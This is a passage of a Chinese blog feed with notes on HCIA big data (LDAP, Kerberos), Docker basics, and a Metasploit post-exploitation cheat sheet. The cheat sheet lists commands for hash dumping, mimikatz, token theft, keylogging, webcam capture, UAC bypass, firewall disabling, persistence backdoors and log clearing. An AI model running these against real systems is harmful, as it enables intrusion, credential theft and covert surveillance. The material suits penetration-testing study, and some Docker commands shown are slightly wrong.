id="Ldap功能模块设计"><a href="#Ldap功能模块设计" class="headerlink" title="Ldap功能模块设计"></a>Ldap功能模块设计</h2><ul><li>查询类操作</li><li>更新类操作</li><li>认证类操作</li><li>其他操作:放弃服务或者扩展服务</li></ul><h2 id="Ldap集成设计"><a href="#Ldap集成设计" class="headerlink" title="Ldap集成设计"></a>Ldap集成设计</h2><ul><li>身份认证架构设计</li></ul><p><img src="/2022/04/20/%E5%8D%8E%E4%B8%BAHCIA/img_40.png" alt="Ldap集成设计"></p><ul><li><p>身份认证流程设计</p><ol><li>应用侧提交认证请求</li><li>Thrift Server从Ldap获取相关用户信息</li><li>Thrift Server执行认证比对</li><li>认证成功后将请求导向响应的应用</li></ol></li><li><p>身份认证功能设计<br>  可以通过组Group和角色Role的方式给用户赋予权限<br>  Group:设置组权限，将用户添加到组中<br>  Role:给角色设定权限，给用户匹配角色</p></li></ul><h2 id="Kerberos认证处理"><a href="#Kerberos认证处理" class="headerlink" title="Kerberos认证处理"></a>Kerberos认证处理</h2><ul><li>krbServer中的三大核心: Client 、KDC、 KDC Server</li><li>Client :接收用户请求</li><li>KDC:生成密钥，发放密钥等</li><li>KDC Server:提供密钥服务</li></ul><h2 id="Kerberos应用流程"><a href="#Kerberos应用流程" class="headerlink" title="Kerberos应用流程"></a>Kerberos应用流程</h2><ol><li>用户提供用户名和密码给登录认证系统</li><li>登录认证系统通过登录认证后，反馈一个当前用户的用户信息卡 (用户、密码、所授权信息)</li><li>用户获取到用户信息卡之后就可以进入到MRS中.</li><li>在MRS中找到对应的要使用的组件,提交自己的信息卡</li><li>组件对比信息卡查看是否具有当前组件的权限</li><li>用户前往权限授权中心,提交信息卡,权限授权中心根据信息卡对指定组件进行授权(ST)</li><li>用户获取到对应组件的授权信息，可以再次向组件发起请求(信息卡, ST)</li><li>组件接收到请求后再次校验,校验结果没问题的话，用户就可以正常使用组件</li></ol>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;大数据概述-amp-解决办法&quot;&gt;&lt;a href=&quot;#大数据概述-amp-解决办法&quot; class=&quot;headerlink&quot; title=&quot;大数据概述&amp;amp;解决办法&quot;&gt;&lt;/a&gt;大数据概述&amp;amp;解决办法&lt;/h1&gt;&lt;h2 id=&quot;大数据的特征（5v-1c）&quot;&gt;&lt;a href=&quot;#大数据的特征（5v-1c）&quot; class=&quot;headerlink&quot; title=&quot;大数据的特征（5v+1c）&quot;&gt;&lt;/a&gt;大数据的特征（5v+1c）&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;大量：数据量巨大，MB,GB,TB,PB&lt;/li&gt;
&lt;li&gt;多样：数据类型多样，数据来源多样 数据来源：服务器日志、网站浏览信息、社交&lt;br&gt;结构化数据：表格数据 平台、摄像头信息&lt;br&gt;半结构化数据：网页html、xml&lt;br&gt;非结构化数据：视频、音频、图片、文字&lt;/li&gt;
&lt;li&gt;高速：数据产生速度快、数据处理速度快&lt;/li&gt;
&lt;li&gt;价值：价值密度低&lt;/li&gt;
&lt;li&gt;准确：数据真实性&lt;/li&gt;
&lt;li&gt;复杂：数据产生速度快、数据的类型多样等特征，导致做数据处理时处理过程变得很复杂&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;大数据处理流程&quot;&gt;&lt;a href=&quot;#大数据处理流程&quot; class=&quot;headerlink&quot; title=&quot;大数据处理流程&quot;&gt;&lt;/a&gt;大数据处理流程&lt;/h2&gt;&lt;p&gt;数据采集-&amp;gt;数据预处理-&amp;gt;数据存储-&amp;gt;分析挖掘-&amp;gt;数据可视化&lt;/p&gt;</summary>
    
    
    
    <category term="笔记" scheme="http://example.com/categories/%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="HCIA" scheme="http://example.com/tags/HCIA/"/>
    
    <category term="大数据" scheme="http://example.com/tags/%E5%A4%A7%E6%95%B0%E6%8D%AE/"/>
    
  </entry>
  
  <entry>
    <title>msf后渗透使用</title>
    <link href="http://example.com/2022/04/18/msf%E5%90%8E%E6%B8%97%E9%80%8F%E4%BD%BF%E7%94%A8/"/>
    <id>http://example.com/2022/04/18/msf%E5%90%8E%E6%B8%97%E9%80%8F%E4%BD%BF%E7%94%A8/</id>
    <published>2022-04-18T00:51:15.000Z</published>
    <updated>2022-04-20T07:15:02.394Z</updated>
    
    <content type="html"><![CDATA[<h1 id="msf后渗透命令整理"><a href="#msf后渗透命令整理" class="headerlink" title="msf后渗透命令整理"></a>msf后渗透命令整理</h1><ul><li>后渗透基本知识</li><li>权限维持,权限提升,内网渗透等</li><li>内网渗透:信息收集,读取用户hash,浏览器密码等</li><li>域渗透:获取域控权限</li></ul><h2 id="1-后渗透基本操作"><a href="#1-后渗透基本操作" class="headerlink" title="1.后渗透基本操作"></a>1.后渗透基本操作</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">background    让meterpreter处于后台</span><br><span class="line">sessions -i 会话号    与会话进行交互</span><br><span class="line">quit     退出会话</span><br><span class="line">shell    获取一个交互式shell</span><br><span class="line">irb            开启ruby终端</span><br></pre></td></tr></table></figure><h2 id="2-文件操作命令"><a href="#2-文件操作命令" class="headerlink" title="2.文件操作命令"></a>2.文件操作命令</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span>     查看文件内容</span><br><span class="line">getwd    查看当前工作目录</span><br><span class="line">upload    上传文件</span><br><span class="line">download    下载文件</span><br><span class="line">edit    编辑文件</span><br><span class="line">search    搜索文件</span><br></pre></td></tr></table></figure><h2 id="3-网络命令"><a href="#3-网络命令" class="headerlink" title="3.网络命令"></a>3.网络命令</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ipconfig/ifconfig查看网络接口信息</span><br><span class="line">portwd端口转发本机监听端口把目标机端口转到本机端口上</span><br><span class="line">rdesktop使用rdesktop来连接 -u 用户名 -p 密码</span><br><span class="line">route获取路由表</span><br></pre></td></tr></table></figure><h2 id="后渗透基本操作"><a href="#后渗透基本操作" class="headerlink" title="后渗透基本操作"></a>后渗透基本操作</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ps    查看当前进程</span><br><span class="line">migrate pid            将meterpreter进程pid移动到指定进程中</span><br><span class="line">execute -H -i -f cmd.exe    创建新进程cmd.exe -H不可见-i交互</span><br><span class="line">getpid获                   取当前进程的pid</span><br><span class="line"><span class="built_in">kill</span> pid            杀死进程</span><br><span class="line">getuid                    查看当前权限</span><br><span class="line">sysinfo                    查看目标机系统信息</span><br></pre></td></tr></table></figure><h2 id="后渗透高级操作"><a href="#后渗透高级操作" class="headerlink" title="后渗透高级操作"></a>后渗透高级操作</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">run post/windows/gather/enum_applications 获取安装软件信息</span><br><span class="line">run post/windows/gather/dumplinks 获取最近的文件操作</span><br><span class="line">run scraper                 获取常见信息</span><br><span class="line">run post/windows/gather/enum_patches         获取补丁信息</span><br><span class="line">run post/windows/gather/enum_domain          查找域控</span><br><span class="line"></span><br><span class="line">load命令  </span><br><span class="line">load mimikatz                                   加载mimikatz</span><br><span class="line">wdigest                                        获取用户密码</span><br><span class="line">load incognito                      加载incognito盗取主机用户令牌假冒用户</span><br></pre></td></tr></table></figure><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">run post/windows/gather/checkvm检查是否为虚拟机</span><br><span class="line">cmd下 quser查看用户是否在线</span><br><span class="line">idletime检查受害者闲置了多久</span><br><span class="line">screenshot        截屏</span><br></pre></td></tr></table></figure><h3 id="用户口令"><a href="#用户口令" class="headerlink" title="用户口令"></a>用户口令</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hashdump获取用户<span class="built_in">hash</span></span><br><span class="line">run post/windows/gather/smart_hashdump获取域的密码</span><br></pre></td></tr></table></figure><h3 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">普通用户利用漏洞获取权限</span><br><span class="line">use exploit/windows/local/ms18_8120_win32k_privesc</span><br></pre></td></tr></table></figure><h3 id="自动匹配提权模块"><a href="#自动匹配提权模块" class="headerlink" title="自动匹配提权模块"></a>自动匹配提权模块</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">use post/multi/recon/local_exploit_suggester</span><br><span class="line">post/windows/gather/enum_patches</span><br></pre></td></tr></table></figure><h3 id="关闭防火墙"><a href="#关闭防火墙" class="headerlink" title="关闭防火墙"></a>关闭防火墙</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh advfirewall <span class="built_in">set</span> allprofiles state off</span><br></pre></td></tr></table></figure><h3 id="本地提权"><a href="#本地提权" class="headerlink" title="本地提权"></a>本地提权</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">search <span class="built_in">local</span>/ms</span><br></pre></td></tr></table></figure><h3 id="绕过UAC"><a href="#绕过UAC" class="headerlink" title="绕过UAC"></a>绕过UAC</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/local/bypassuac </span><br><span class="line">use exploit/windows/local/bypassuac_injection </span><br><span class="line">use windows/local/bypassuac_vbs </span><br><span class="line">use windows/local/ask</span><br></pre></td></tr></table></figure><h3 id="获取system权限"><a href="#获取system权限" class="headerlink" title="获取system权限"></a>获取system权限</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getsystem</span><br></pre></td></tr></table></figure><h3 id="缓存口令"><a href="#缓存口令" class="headerlink" title="缓存口令"></a>缓存口令</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">获取谷歌chrome缓存</span><br><span class="line">run post/windows/gather/enum_chrome</span><br><span class="line"></span><br><span class="line">获取火狐firfox缓存</span><br><span class="line">run post/windows/gather/enum_firefox</span><br><span class="line"></span><br><span class="line">获取IE缓存</span><br><span class="line">run post/windows/gather/enum_ie</span><br></pre></td></tr></table></figure><h3 id="键盘记录"><a href="#键盘记录" class="headerlink" title="键盘记录"></a>键盘记录</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">keyscan_start开启键盘记录</span><br><span class="line">keyscan_dump显示捕捉到的记录</span><br><span class="line">keyscan_stop停止键盘记录</span><br></pre></td></tr></table></figure><h3 id="域口令获取"><a href="#域口令获取" class="headerlink" title="域口令获取"></a>域口令获取</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">steal_token 试图窃取指定(pid)进程的令牌</span><br><span class="line">use incognito加载incoginto功能(盗取目标主机的令牌或是假冒用户)</span><br><span class="line">list_tokens -u列出目标主机用户的可用令牌</span><br><span class="line">list_tokens -g列出目标主机用户组的可用令牌</span><br></pre></td></tr></table></figure><h3 id="摄像头信息"><a href="#摄像头信息" class="headerlink" title="摄像头信息"></a>摄像头信息</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">record_mic音频录制</span><br><span class="line">webcam_chat查看摄像头接口</span><br><span class="line">webcam_list查看摄像头列表</span><br><span class="line">webcam_stream摄像头视频获取</span><br></pre></td></tr></table></figure><h3 id="后门持久化-权限维持"><a href="#后门持久化-权限维持" class="headerlink" title="后门持久化,权限维持"></a>后门持久化,权限维持</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">1.migrate</span><br><span class="line">migrate pid</span><br><span class="line">可以将meterpreter的当前进程迁移到其他指定进程中,这样做的好处是给后门一个相对稳定的环境,同时可以防止杀软</span><br><span class="line"></span><br><span class="line">2.metsvc</span><br><span class="line">run metsvc -A</span><br><span class="line">meterpreter提供两种方式的后门,一种是通过服务启动(metsvc),一种是通过启动项启动(persistence).</span><br><span class="line">通过服务(metsvc)启动方式,优点是命令简单方便,不需要设置太多参数.缺点是只要发现了这个后门,所有人都可以连接</span><br><span class="line"></span><br><span class="line">3.persistence</span><br><span class="line">run persistence -S -U -X -i 5 -p 端口 -r ip</span><br><span class="line">通过开机启动项启动的方式,缺点是命令参数多比较复杂,可能因为启动项权限原因,导致失败,且并无回显.优点是,因为载入启动项中,所以一般的杀软都会放行,如果在用shellcode做下免杀会更好,当然这是后话</span><br><span class="line">-A   自动启动一个匹配的exploit / multi / handler来连接到代理</span><br><span class="line">-L   如果未使用％TEMP％，则在目标主机中写入有效负载的位置。</span><br><span class="line">-P   有效负载使用，默认为windows / meterpreter / reverse_tcp。</span><br><span class="line">-S   作为服务自动启动代理程序（具有SYSTEM权限）</span><br><span class="line">-T   要使用的备用可执行模板</span><br><span class="line">-U   用户登录时自动启动代理</span><br><span class="line">-X   系统引导时自动启动代理程序</span><br><span class="line">-h   这个帮助菜单</span><br><span class="line">-i   每次连接尝试之间的时间间隔（秒）</span><br><span class="line">-p   运行Metasploit的系统正在侦听的端口</span><br><span class="line">-r   运行Metasploit监听连接的系统的IP</span><br><span class="line"></span><br><span class="line">4.run vnc(远程控制,类似3389远程桌面)</span><br><span class="line">run vnc</span><br><span class="line">run post/windows/manager/enable_rdp开启远程桌面</span><br><span class="line"></span><br><span class="line">5.getuid(创建一个用户,客户端化)</span><br><span class="line">常用命令</span><br><span class="line">run getuid -e开启远程桌面</span><br><span class="line">run getuid -u name -p password添加用户</span><br><span class="line">run getuid -f4446 -e将3389端口转发到4446</span><br></pre></td></tr></table></figure><h3 id="清除痕迹"><a href="#清除痕迹" class="headerlink" title="清除痕迹"></a>清除痕迹</h3><p>清楚所有日志信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">clearev</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;msf后渗透命令整理&quot;&gt;&lt;a href=&quot;#msf后渗透命令整理&quot; class=&quot;headerlink&quot; title=&quot;msf后渗透命令整理&quot;&gt;&lt;/a&gt;msf后渗透命令整理&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;后渗透基本知识&lt;/li&gt;
&lt;li&gt;权限维持,权限提升,内网渗透等&lt;/li&gt;
&lt;li&gt;内网渗透:信息收集,读取用户hash,浏览器密码等&lt;/li&gt;
&lt;li&gt;域渗透:获取域控权限&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;1-后渗透基本操作&quot;&gt;&lt;a href=&quot;#1-后渗透基本操作&quot; class=&quot;headerlink&quot; title=&quot;1.后渗透基本操作&quot;&gt;&lt;/a&gt;1.后渗透基本操作&lt;/h2&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;background		    让meterpreter处于后台&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;sessions -i 会话号	    与会话进行交互&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;quit 			    退出会话&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;shell			    获取一个交互式shell&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;irb		            开启ruby终端&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;


&lt;h2 id=&quot;2-文件操作命令&quot;&gt;&lt;a href=&quot;#2-文件操作命令&quot; class=&quot;headerlink&quot; title=&quot;2.文件操作命令&quot;&gt;&lt;/a&gt;2.文件操作命令&lt;/h2&gt;</summary>
    
    
    
    <category term="工具使用" scheme="http://example.com/categories/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/"/>
    
    
    <category term="kali" scheme="http://example.com/tags/kali/"/>
    
    <category term="渗透" scheme="http://example.com/tags/%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>docker基本使用</title>
    <link href="http://example.com/2022/04/18/docker%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/"/>
    <id>http://example.com/2022/04/18/docker%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/</id>
    <published>2022-04-18T00:33:24.000Z</published>
    <updated>2022-04-18T00:34:49.930Z</updated>
    
    <content type="html"><![CDATA[<h2 id="docker帮助命令"><a href="#docker帮助命令" class="headerlink" title="docker帮助命令"></a>docker帮助命令</h2><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="keyword">version</span> 显示版本信息</span><br><span class="line">docker <span class="keyword">help</span> 帮助</span><br><span class="line">docker info 基本信息</span><br></pre></td></tr></table></figure><h2 id="docker镜像命令"><a href="#docker镜像命令" class="headerlink" title="docker镜像命令"></a>docker镜像命令</h2><figure class="highlight dsconfig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">docker</span> <span class="string">images</span></span><br><span class="line"><span class="comment"># 可选项</span></span><br><span class="line">-<span class="string">a</span>, <span class="built_in">--all</span>   <span class="comment"># 列出所有镜像</span></span><br><span class="line">-<span class="string">q</span>, <span class="built_in">--quite</span> <span class="comment"># 只显示镜像的id</span></span><br></pre></td></tr></table></figure><h4 id="docker-search-搜索镜像"><a href="#docker-search-搜索镜像" class="headerlink" title="docker search 搜索镜像"></a>docker search 搜索镜像</h4><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 可选项</span></span><br><span class="line"><span class="attr">--filter</span>=STARS=<span class="number">3000</span> <span class="comment"># 搜索星在3000以上的</span></span><br></pre></td></tr></table></figure><h4 id="docker-pull-下载镜像"><a href="#docker-pull-下载镜像" class="headerlink" title="docker pull 下载镜像"></a>docker pull 下载镜像</h4><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># 下载镜像 docker pull 镜像名 tag</span></span><br><span class="line"><span class="meta"># 如果不写tag默认就是最新版</span></span><br></pre></td></tr></table></figure><h4 id="删除容器"><a href="#删除容器" class="headerlink" title="删除容器"></a>删除容器</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="built_in">rm</span> <span class="operator">-f</span> id <span class="comment"># 删除指定容器</span></span><br><span class="line">docker <span class="built_in">rm</span> <span class="operator">-f</span> <span class="variable">$</span>(docker images <span class="literal">-qa</span>) <span class="comment"># 删除所有容器</span></span><br></pre></td></tr></table></figure><h2 id="docker容器命令"><a href="#docker容器命令" class="headerlink" title="docker容器命令"></a>docker容器命令</h2><p><strong>新建容器并启动</strong></p><figure class="highlight ldif"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="literal">-</span>-name = &quot;名字&quot; <span class="comment"># 给容器起一个名字</span></span><br><span class="line"><span class="literal">-</span>d            <span class="comment"># 后台方式运行</span></span><br><span class="line"><span class="literal">-</span>it           <span class="comment"># 使用交互式方式运行</span></span><br><span class="line"><span class="literal">-</span>P            <span class="comment"># 指定容器的端口</span></span><br><span class="line">    1.ip:主机端口:容器端口</span><br><span class="line">    2.主机端口:容器端口(常用)</span><br><span class="line">    3.容器端口</span><br><span class="line"><span class="literal">-</span>p            <span class="comment"># 随机端口</span></span><br></pre></td></tr></table></figure><p><strong>使用</strong></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">chenci@MacBook-Pro ~ %docker run -it centos <span class="regexp">/bin/</span>bash</span><br><span class="line"></span><br><span class="line">退出</span><br><span class="line"><span class="keyword">exit</span></span><br></pre></td></tr></table></figure><p><strong>查看运行的容器</strong></p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">docker</span> ps </span><br><span class="line"><span class="comment"># -a 历史运行过的容器</span></span><br><span class="line"><span class="comment"># -n=? 显示最近创建的容器</span></span><br><span class="line"><span class="comment"># -q 只显示容器的编号</span></span><br></pre></td></tr></table></figure><p><strong>启动和停止容器</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">docker start <span class="built_in">id</span> <span class="comment">#启动容器</span></span><br><span class="line">docker restart <span class="built_in">id</span> <span class="comment">#重启容器</span></span><br><span class="line">docker stop <span class="built_in">id</span> <span class="comment">#停止当前正在运行的容器</span></span><br><span class="line">docker <span class="built_in">kill</span> <span class="built_in">id</span> <span class="comment">#强制停止当前容器</span></span><br></pre></td></tr></table></figure><p><strong>查看日志</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker logs -tf --<span class="built_in">tail</span> 日志条数 <span class="built_in">id</span></span><br></pre></td></tr></table></figure><p><strong>查看镜像元数据</strong></p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker inspect <span class="built_in">id</span></span><br></pre></td></tr></table></figure><p><strong>进入正在运行的容器</strong></p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 方法一</span></span><br><span class="line">docker attach <span class="built_in">id</span> <span class="comment"># 进入容器正在执行的终端</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#方法二</span></span><br><span class="line">docker exec -<span class="keyword">it</span> <span class="built_in">id</span> bashshell <span class="comment">#进入容器后开启新的终端</span></span><br></pre></td></tr></table></figure><p><strong>从容器拷贝文件到主机</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="built_in">cp</span> <span class="built_in">id</span>:容器内路径 目标主机路径</span><br></pre></td></tr></table></figure><h2 id="实例-安装nginx"><a href="#实例-安装nginx" class="headerlink" title="实例-安装nginx"></a>实例-安装nginx</h2><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">1</span>.搜索镜像</span><br><span class="line"><span class="attribute">docker</span> search nginx</span><br><span class="line"></span><br><span class="line"><span class="attribute">2</span>.拉取镜像</span><br><span class="line"><span class="attribute">docker</span> pull nginx</span><br><span class="line"></span><br><span class="line"><span class="attribute">3</span>.启动并映射到本地<span class="number">3344</span>端口</span><br><span class="line"><span class="attribute">docker</span> run -d --name nginx01 -p <span class="number">3344</span>:<span class="number">80</span> nginx</span><br><span class="line"></span><br><span class="line"><span class="attribute">4</span>.测试</span><br><span class="line"><span class="attribute">curl</span> localhost:<span class="number">3344</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">5</span>.进入容器</span><br><span class="line"><span class="attribute">docker</span> exec -it nginx01 /bin/bash</span><br></pre></td></tr></table></figure><h2 id="实例-安装tomcat"><a href="#实例-安装tomcat" class="headerlink" title="实例-安装tomcat"></a>实例-安装tomcat</h2><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>拉取镜像</span><br><span class="line">官方版</span><br><span class="line">docker <span class="built_in">run</span> -<span class="keyword">it</span> <span class="comment">--rm tomcat:9.0 #没有此镜像就会去自动下载,--rm退出后就删除镜像,一般用于测试</span></span><br><span class="line"></span><br><span class="line"><span class="number">1.</span>拉取镜像</span><br><span class="line">docker -pull tamcat</span><br><span class="line"></span><br><span class="line"><span class="number">2.</span>启动并映射</span><br><span class="line">docker <span class="built_in">run</span> -d -p <span class="number">3355</span>:<span class="number">8080</span> <span class="comment">--name tomcat01 tomcat</span></span><br><span class="line"></span><br><span class="line"><span class="number">3.</span>测试访问,发现<span class="number">404</span></span><br><span class="line">curl localhost:<span class="number">3355</span></span><br><span class="line"></span><br><span class="line"><span class="number">4.</span>进入容器</span><br><span class="line">docker exec -<span class="keyword">it</span> tomcat01 /bin/bash</span><br><span class="line"></span><br><span class="line"><span class="number">5.</span>拷贝</span><br><span class="line">cp -r webapps.dist/* webapps/</span><br></pre></td></tr></table></figure><h2 id="commit镜像"><a href="#commit镜像" class="headerlink" title="commit镜像"></a>commit镜像</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">docker commit 提交容器成为一个新的副本</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">与git相似</span></span><br><span class="line">docker commit -m=&#x27;提交的描述信息&#x27; -a=&#x27;作者&#x27; 容器id 目标镜像名:[tag]</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">1.利用原来的tomcat制作一个新镜像</span></span><br><span class="line">docker commit -a=&#x27;chenci&#x27; -m=&#x27;add webapps&#x27; id tomcat02:1.0</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="容器数据卷"><a href="#容器数据卷" class="headerlink" title="容器数据卷"></a>容器数据卷</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span 